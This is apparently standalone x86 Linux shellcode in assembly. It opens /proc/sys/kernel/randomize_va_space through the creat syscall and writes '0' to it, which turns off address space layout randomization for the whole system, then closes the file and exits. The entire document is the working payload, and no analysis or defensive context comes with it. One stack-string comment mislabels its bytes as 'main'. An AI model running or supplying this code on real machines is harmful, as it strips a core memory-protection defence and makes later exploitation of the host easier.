global _start
section .text

_start:
	; Clear registers
	xor    eax,eax
	
	; sys_creat
	; int creat(const char *pathname, mode_t mode);
	push   eax		; Terminate string with NULL
	push 0x65636170 	; 'pace'
	push 0x735f6176 	; 'va_s'
	push 0x5f657a69 	; 'ize_'
	push 0x6d6f646e 	; 'ndom'
	push 0x61722f6c 	; main
	push 0x656e7265 	; 'erne'
	push 0x6b2f7379 	; 'ys/k'
	push 0x732f636f 	; 'oc/s'
	push 0x72702f2f 	; '//pr'
	mov    ebx,esp		; Copy stackpointer to stringvalue in EBX for pathname argument
	mov    cx,0x2bc		; Value for mode argument, 700 --> S_IRWXU
	mov    al,0x8		; sys_create call 0x8
	int    0x80		; syscall
	
	; sys_write
	; ssize_t write(int fd, const void *buf, size_t count);
	mov    ebx,eax		; Copy previously stored FD from creat into EBX
	push   eax		; Push the FD on stack
	mov    dx,0x3a30	; Count value parameter for size
	push   dx		; Put value on stack
	mov    ecx,esp		; Copy the current stackpointer to ECX for buffer argument
	xor    edx,edx		; Clear EDX
	inc    edx		; Set to 1
	mov    al,0x4		; Set syscall 0x4 for write
	int    0x80		; syscall
	
	; sys_close
	mov    al,0x6		; Close call
	int    0x80		; syscall
	
	; sys_exit
	inc    eax		; Previous value after syscall was 0, increment for 1
	int    0x80		; syscall exit

